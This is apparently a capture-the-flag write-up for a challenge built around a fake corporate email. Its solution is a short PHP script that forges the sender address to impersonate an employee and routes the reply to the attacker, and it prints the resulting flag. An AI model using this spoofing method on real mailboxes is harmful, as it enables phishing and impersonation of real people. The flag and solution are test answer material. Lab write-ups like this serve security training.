# Onboarding Checklist

## Points
468

## Description
```
From: importantperson@somebigcorp.com
Date: Feb 22, 2019 9:00 AM
To: someguy@somebigcorp.com
Subject: New Employee Access

Hello Some Guy,

We need to begin sending requests for the new employee to get access to our security appliances. I believe they already know that you are authorized to make a new account request. Would you mind sending the new employee's email address to tamuctf@gmail.com so they can process the account request?

Thank you,
Important Person
```

The new employee can be a little slow to respond.

Difficulty: easy

2/26 8:42 am CST: Visting somebigcorp.com is not part of the challenge

## Solution
Let's send an e-mail pretending we are `Some Guy`.
```php
<?
$phisher = 'phisher@gmail.com';
$from    = 'someguy@somebigcorp.com';
$to      = 'tamuctf@gmail.com';
$subject = 'New Employee Access';
$message = $phisher;
$headers = 'From: ' . $from . "\r\n" .
    'Reply-To: ' . $phisher . "\r\n" .
    'Cc: ' . $phisher . "\r\n" .
    'X-Mailer: PHP/' . phpversion();

mail($to, $subject, $message, $headers);

echo "Sent";
?>
```
We will get a response
```
Hello new employee! Some Guy sent me your email. Here is your key
gigem{wuT_4n_31337_sp0ofer_494C4F5645594F55}
```

## Flag
`gigem{wuT_4n_31337_sp0ofer_494C4F5645594F55}`